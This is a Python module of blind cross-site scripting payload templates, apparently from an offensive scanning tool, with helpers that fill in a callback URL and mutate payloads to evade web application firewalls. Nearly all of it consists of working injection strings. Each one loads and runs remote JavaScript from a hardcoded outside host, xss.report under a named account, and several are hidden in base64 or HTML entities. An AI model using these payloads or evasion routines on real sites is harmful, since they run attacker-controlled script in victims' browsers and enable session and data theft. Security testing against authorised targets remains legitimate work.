"""Blind XSS payload templates."""
import random
import urllib.parse
import base64

# Script injection payloads (direct script tag loading, most reliable)
SCRIPT_PAYLOADS = [
    "'\"><script src=https://xss.report/c/srikanthreddy334></script>",
    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/srikanthreddy334\\';document.body.appendChild(a)')",
    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/srikanthreddy334");a.send();</script>',
    'var a=document.createElement("script");a.src="https://xss.report/c/srikanthreddy334";document.body.appendChild(a);',
    '<script>$.getScript("//xss.report/c/srikanthreddy334")</script>',
    '<script>fetch("//xss.report/c/srikanthreddy334").then(r=>r.text()).then(t=>eval(t))</script>',
    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\\xss.report\\c\\srikanthreddy334/.source))//>',
    '%22%3E%3Cscript%20src=https://xss.report/c/srikanthreddy334%3E%3C/script%3E',
    'javascript:eval(\'var%20a=document.createElement(%5C\'script%5C\');a.src=%5C\'https://xss.report/c/srikanthreddy334%5C\';document.body.appendChild(a)\')',
    '%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D;a=new%20XMLHttpRequest();a.addEventListener(%22load%22,%20b);a.open(%22GET%22,%20%22//xss.report/c/srikanthreddy334%22);a.send();%3C/script%3E',
    'var%20a=document.createElement(%22script%22);a.src=%22https://xss.report/c/srikanthreddy334%22;document.body.appendChild(a);',
    '%3Cscript%3E$.getScript(%22//xss.report/c/srikanthreddy334%22)%3C/script%3E',
    '%3Cscript%3Efetch(%22//xss.report/c/srikanthreddy334%22).then(r=%3Er.text()).then(t=%3Eeval(t))%3C/script%3E',
    'javascript:%22/*\'/*%60/*--%3E%3C/noscript%3E%3C/title%3E%3C/textarea%3E%3C/style%3E%3C/template%3E%3C/noembed%3E%3C/script%3E%3Chtml%20%22%20onmouseover=/*&lt;svg/*/onload=(import(/https:%5Cxss.report%5Cc%5Csrikanthreddy334/.source))//%3E',
]

# Event handler payloads (onerror, onfocus, onmouseover, onload)
EVENT_HANDLER_PAYLOADS = [
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>',
    '<svg onload="javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://xss.report/c/srikanthreddy334\\\';document.body.appendChild(a)\')" />',
    '<div onmouseover="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)">Hover me</div>',
    '<body onload="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)">',
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>',
    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/srikanthreddy334&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
    '<audio src="x" onerror="var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)">',
    '%22%3E%3Cvideo%3E%3Csource%20onerror=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%3E',
    '%3Csvg%20onload=%22javascript:eval(\'var%20a=document.createElement(%5C\'script%5C\');a.src=%5C\'https://xss.report/c/srikanthreddy334%5C\';document.body.appendChild(a)\')%22%20/%3E',
    '%3Cdiv%20onmouseover=%22var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3EHover%20me%3C/div%3E',
    '%3Cbody%20onload=%22var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3E',
    '%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20onerror=eval(atob(this.id))%3E',
    '%22%3E%3Cinput%20onfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NyaWthbnRocmVkZHkzMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20autofocus%3E',
    '%22%3E%3Ciframe%20srcdoc=%22&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/srikanthreddy334&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;%22%3E',
    '%3Caudio%20src=%22x%22%20onerror=%22var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3E',
]

# Filter bypass payloads (comment chains, import tricks, etc.)
BYPASS_PAYLOADS = [
    '<iframe src="javascript:var a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)"></iframe>',
    '%3Ciframe%20src=%22javascript:var%20a=document.createElement(\'script\');a.src=\'https://xss.report/c/srikanthreddy334\';document.body.appendChild(a)%22%3E%3C/iframe%3E',
]

# JSON context payloads (for API endpoint injection)
JSON_PAYLOADS = []

# Header injection payloads (Referer, X-Forwarded-For)
HEADER_PAYLOADS = []

# Cookie/localStorage exfiltration payloads (with data leakage)
EXFIL_PAYLOADS = []


def get_script_payloads():
    """Return script-based XSS payloads."""
    return SCRIPT_PAYLOADS


def get_event_handler_payloads():
    """Return event handler XSS payloads."""
    return EVENT_HANDLER_PAYLOADS


def get_bypass_payloads():
    """Return filter bypass XSS payloads."""
    return BYPASS_PAYLOADS


def get_json_payloads():
    """Return JSON context XSS payloads."""
    return JSON_PAYLOADS


def get_header_payloads():
    """Return HTTP header XSS payloads."""
    return HEADER_PAYLOADS


def get_exfil_payloads():
    """Return data exfiltration XSS payloads."""
    return EXFIL_PAYLOADS


def get_all_payloads():
    """Return all payload categories."""
    return {
        "script": SCRIPT_PAYLOADS,
        "event": EVENT_HANDLER_PAYLOADS,
        "bypass": BYPASS_PAYLOADS,
        "json": JSON_PAYLOADS,
        "header": HEADER_PAYLOADS,
        "exfil": EXFIL_PAYLOADS,
    }


# --- Mutation helpers (lightweight evasions) ---
def _mutate_case(payload: str) -> str:
    """Randomize casing of HTML/JS keywords to dodge naive filters."""
    return random.choice([payload.lower(), payload.upper(), payload.swapcase()])


def _insert_comment_gaps(payload: str) -> str:
    """Split risky tokens with harmless comment gaps (e.g., scr<!-- -->ipt)."""
    replacements = {
        "script": "scr<!-- -->ipt",
        "onerror": "on<!-- -->error",
        "onload": "on<!-- -->load",
        "javascript:": "java<!-- -->script:",
    }
    mutated = payload
    for needle, repl in replacements.items():
        mutated = mutated.replace(needle, repl).replace(needle.upper(), repl).replace(needle.capitalize(), repl)
    return mutated


def _pad_whitespace(payload: str) -> str:
    """Add benign whitespace to break strict regex rules."""
    return payload.replace("<", "< ").replace(">", " >")


def _html_entity_encode(payload: str) -> str:
    """Encode critical chars to bypass naive blockers (aggressive)."""
    return payload.replace("<", "&#60;").replace(">", "&#62;").replace("\"", "&#34;")


def _url_encode_fragments(payload: str) -> str:
    """URL-encode risky characters while keeping path separators (aggressive)."""
    return urllib.parse.quote(payload, safe="/:{}")


def apply_mutators(payload: str, aggressive: bool = False, max_mutations: int = 2) -> str:
    """Apply a small set of obfuscation steps to help bypass naive WAF filters."""
    base_mutators = [_mutate_case, _insert_comment_gaps, _pad_whitespace]
    extra_mutators = [_html_entity_encode, _url_encode_fragments] if aggressive else []
    mutators = base_mutators + extra_mutators
    try:
        choices = random.sample(mutators, k=min(max_mutations, len(mutators)))
        mutated = payload
        for fn in choices:
            mutated = fn(mutated)
        return mutated
    except Exception:
        return payload


def substitute_placeholders(payload: str, listener_url: str, uuid: str) -> str:
    """
    Replace {LISTENER}, {LISTENER_HOST}, and {UUID} in payload template.
    
    Args:
        payload: Payload template string with placeholders
        listener_url: Full listener URL (e.g., http://192.168.1.10:5000)
        uuid: Unique identifier for this injection
    
    Returns:
        Substituted payload string ready for injection
    """
    listener_url = listener_url.rstrip('/')
    # Extract host from URL for protocol-relative payloads
    listener_host = listener_url.split('://')[-1] if '://' in listener_url else listener_url
    
    js_loader = (
        'var a=document.createElement("script");'
        f'a.src="{listener_url}/c/{uuid}";'
        'document.body.appendChild(a);'
    )
    b64_js = base64.b64encode(js_loader.encode("utf-8")).decode("ascii")

    return (
        payload
        .replace('{LISTENER}', listener_url)
        .replace('{LISTENER_HOST}', listener_host)
        .replace('{UUID}', uuid)
        .replace('{B64_JS}', b64_js)
    )


def get_payloads_for_context(context: str, listener_url: str, uuid: str) -> list:
    """
    Get context-specific payloads with placeholders substituted.
    
    Args:
        context: Injection context ('query', 'body', 'header', 'json')
        listener_url: Full listener callback URL
        uuid: Unique identifier for this injection
    
    Returns:
        List of ready-to-inject payload strings
    """
    all_payloads = get_all_payloads()
    
    if context == 'query' or context == 'body':
        # Use script + event + bypass for standard form/query injection
        payloads = all_payloads['script'] + all_payloads['event'] + all_payloads['bypass']
    elif context == 'json':
        # Use JSON-safe payloads for JSON parameters
        payloads = all_payloads['json']
    elif context == 'header':
        # Use header-safe payloads for HTTP headers
        payloads = all_payloads['header']
    else:
        # Fallback: all payloads
        payloads = all_payloads['script']
    
    return [substitute_placeholders(p, listener_url, uuid) for p in payloads]

